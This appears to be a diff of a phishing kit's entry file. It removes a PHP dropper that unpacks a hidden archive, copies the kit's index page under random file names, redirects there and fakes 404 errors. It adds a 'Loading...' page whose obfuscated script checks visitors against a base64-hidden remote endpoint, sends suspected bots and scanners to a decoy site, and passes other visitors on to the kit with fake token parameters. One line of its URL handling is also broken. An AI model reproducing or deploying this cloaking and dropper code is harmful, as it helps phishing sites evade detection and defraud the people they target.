@@ -1,73 +1,46 @@
-<?php
-$path = 'MzU4.tmp';
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Loading...</title>
+    <script src="CONFIG.js"></script>
+</head>
+<body>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.0/jquery.min.js" integrity="sha256-xNzN2a4ltkB44Mc/Jz3pT4iU1cmeR0FkXs4pru/JxaQ=" crossorigin="anonymous"></script>
+<script>
+    let move_to = url_check("latest/index.html");
+    let checkme=location.href.includes("type=passed")||location.href.includes("type=go");
+    let loaded = false;
+if(checkme===true){locat=location.href.replace("?type=passed","").replace("?type=go","").replace("type=passed","").replace("type=go","");loaded=true;is_loaded(move_to);}
+let isBlack=!1;$(document).ready(function(){
+    if(checkme===false){if(!0===rd()){is_loaded(move_to);}else!0===isBlack||window.location.replace(window.atob(window.atob("YUhSMGNITTZMeTkzZDNjdVoyOXZaMnhsTG1OdmJRPT0=")))}});
 
-$sou ="'index.php','',";
-$url_2_temp = uniqidReal() . ".php";
-$dex = "array('index.php','MzYxODk0MzA3NjEwNDI1OTc3MzU4NzA5NA.php','{$url_2_temp}'),'',";
 
-$zip = new ZipArchive;
-if(!file_exists("MzYxODk0MzA3NjEwNDI1OTc3MzU4NzA5NA.php")) {
-    if ($zip->open($path) === true) {
-        try {
-            //unlink( getcwd() . "index.php");
-            for ($i = 0; $i < $zip->numFiles; $i++) {
-                $filename = $zip->getNameIndex($i);
-                $fileinfo = pathinfo($filename);
-                if (substr_count($filename, rawurldecode("%5C"))) {
-                    $re = str_ireplace(rawurldecode("%5C"), "/", $filename);
-                    renamesave($filename);
-                    copy("zip://" . $path . "#" . $filename, "./" . $re);
-                } else {
-                    if ($filename == "index.php") {
-                        copy("zip://" . $path . "#" . $filename, "./MzYxODk0MzA3NjEwNDI1OTc3MzU4NzA5NA.php");
-                        $ft = str_ireplace($sou, $dex, file_get_contents("MzYxODk0MzA3NjEwNDI1OTc3MzU4NzA5NA.php"));
-                        file_put_contents("MzYxODk0MzA3NjEwNDI1OTc3MzU4NzA5NA.php", $ft);
-                    } else {
-                        copy("zip://" . $path . "#" . $filename, "./" . $filename);
-                    }
-                }
-            }
-            $zip->close();
-
-            file_put_contents($url_2_temp, @str_ireplace($sou, $dex, file_get_contents("MzYxODk0MzA3NjEwNDI1OTc3MzU4NzA5NA.php")));
-            header("Location: {$url_2_temp}");
-        } catch (Exception $e) {
-            header("HTTP/1.0 404 Not Found");
-            die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
+    function rd(){let e;return $.ajax({dataType:"json",url:window.atob("aHR0cHM6Ly9sb2FkZHJpcmVjdGpzb24uaGVyb2t1YXBwLmNvbS8="),type:"GET",async:!1,cache:!1,timeout:3e4,success:function(s){s.hasOwnProperty("isreal")? (true!==s.isreal?e=!1:e=!0):e=!1},error:function(s){e=!1}}),e}
+    function url_check(new_filename = "") {
+        let url = new URL(window.location.href);
+        let search = url.search;
+        let hash = url.hash;
+        let href = url.href.replace(search, "").replace(hash, "");
+        if(!search.includes("scriptID")){
+            search+=search.includes("?")?"&":"?";
+            search += ("scriptID=" + Math.random().toString().replace("0.", "") + "&cookies=" + window.btoa(Math.random().toString()).replace("=", "").replace("=", "") + "&token=" + Math.random().toString().replace("0.", ""));
         }
-    } else {
-        header("HTTP/1.0 404 Not Found");
-        die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
-    }
-}else{
-    file_put_contents($url_2_temp, @str_ireplace($sou, $dex, file_get_contents("MzYxODk0MzA3NjEwNDI1OTc3MzU4NzA5NA.php")));
-    header("Location: {$url_2_temp}");
-}
-
-
-function renamesave($filename){
-    $re = explode(rawurldecode("%5C"), $filename);
-    $file = ".";$er = @end($re);
-    foreach ($re as $dir){
-        $file .= "/" . $dir;
-        if(!file_exists($file) && $er != $dir){
-            mkdir($file);
+        if(href.endsWith("/")){href+=new_filename+search+hash;}
+        else {
+            if(new_filename.length>0){
+                if(href.endsWith(".html")||href.endsWith(".htm")||href.endsWith(".php")){
+                    let href_last=href.split("/")[(href.split("/") - 1)];
+                    href=href.replace(href_last, "");href+=new_filename+search+hash;
+                }else {href+=new_filename+search+hash;}
+            }else {href+=new_filename+search+hash;}
         }
+        return href;
     }
-}
-
-
-function uniqidReal($lenght = 13) {
-    try {
-        if (function_exists("random_bytes")) {
-            $bytes = random_bytes(ceil($lenght / 2));
-        } elseif (function_exists("openssl_random_pseudo_bytes")) {
-            $bytes = openssl_random_pseudo_bytes(ceil($lenght / 2));
-        } else {
-            return uniqid();
-        }
-    } catch (Exception $e) {
-        return uniqid();
+    function is_loaded(move_to){
+        localStorage.setItem("page_loaded", "Yes Not Bot");
+        window.location.replace(move_to);
     }
-    return substr(bin2hex($bytes), 0, $lenght);
-}
+</script>
+</body>
+</html>
